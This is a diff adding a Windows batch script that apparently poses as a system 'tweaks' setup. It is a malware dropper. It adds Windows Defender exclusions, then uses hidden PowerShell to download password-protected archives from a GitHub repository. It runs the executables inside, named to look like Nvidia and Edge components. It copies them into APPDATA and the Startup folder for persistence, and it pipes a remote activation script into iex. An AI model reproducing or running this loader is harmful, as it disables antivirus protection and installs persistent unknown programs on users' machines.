@@ -1,0 +1,14 @@
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:APPDATA"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath $env:TEMP"
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath (Join-Path $env:APPDATA 'System')"
+powershell -w h -c "(iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/me.7z' -OutFile \"$env:TEMP\\me.7z\"); (iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/7z.exe' -OutFile \"$env:TEMP\\7z.exe\"); (iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/7z.dll' -OutFile \"$env:TEMP\\7z.dll\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\me.7z`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\me.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\me.exe\" -Destination $dest -Force"
+powershell -w h -c "(iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/NvidiaApp.7z.003' -OutFile \"$env:TEMP\NvidiaApp.7z.003\");
+powershell -w h -c "(iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/NvidiaApp.7z.002' -OutFile \"$env:TEMP\NvidiaApp.7z.002\");
+powershell -w h -c "(iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/NvidiaApp.7z.001' -OutFile \"$env:TEMP\\NvidiaApp.7z.001\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\NvidiaApp.7z.001`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\NvidiaApp.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\NvidiaApp.exe\" -Destination $dest -Force"
+powershell -w h -c "(iwr -uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/medge.7z' -OutFile \"$env:TEMP\\medge.7z\"); Start-Process \"$env:TEMP\\7z.exe\" -ArgumentList \"x `\"$env:TEMP\\medge.7z`\" -p@123456789@ -o`\"$env:TEMP\\extract`\" -y\" -Wait; Start-Process \"$env:TEMP\\extract\\medge.exe\"; $dest=\"$env:APPDATA\\system\"; if (!(Test-Path $dest)) { New-Item -ItemType Directory -Path $dest -Force }; Copy-Item \"$env:TEMP\\extract\\medge.exe\" -Destination $dest -Force; Copy-Item \"$env:TEMP\\extract\\medge.exe\" -Destination \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" -Force"
+:: Tweaks
+:: powershell -Command "irm 'https://christitus.com/win' | iex"
+:: Windows Activation + Office
+powershell -Command "irm 'https://get.activated.win' | iex"
+:: Adsk-stuff
+:: powershell -Command "Invoke-WebRequest -Uri 'https://github.com/fixingmanagment/tweaks/raw/refs/heads/main/ADSK.rar' -OutFile \"$env:USERPROFILE\Downloads\ADSK.rar\""
